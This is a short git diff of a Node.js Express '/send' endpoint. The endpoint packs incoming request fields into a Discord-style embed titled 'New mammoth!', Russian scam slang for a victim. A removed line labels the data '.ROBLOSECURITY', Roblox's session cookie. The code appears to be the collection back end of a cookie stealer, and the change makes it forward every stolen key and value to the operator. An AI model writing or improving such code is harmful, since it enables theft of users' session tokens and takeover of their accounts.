@@ -17,7 +17,6 @@ app.post('/send', async (req, res) => {
         const reqBody = req.body;
         const fieldsArray = [];
         let index = 0;
-        let embds = []
         let embed = {
             title: "Новый мамонт!",
             description: "All systems operational",
@@ -30,13 +29,14 @@ app.post('/send', async (req, res) => {
             },
             timestamp: new Date().toISOString()
         };
+        console.log(reqBody);
         for (const key in reqBody) {
             if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
                 index++;
                 //name: "Memory",
                 //value: "4.2 GB / 16 GB",
                 //inline: true
-                embed.fields.push({name: ".ROBLOSECURITY", value: key, inline: true});
+                embed.fields.push({ name: key, value: reqBody[key], inline: true });
                 console.log(key,index);
             }
         }
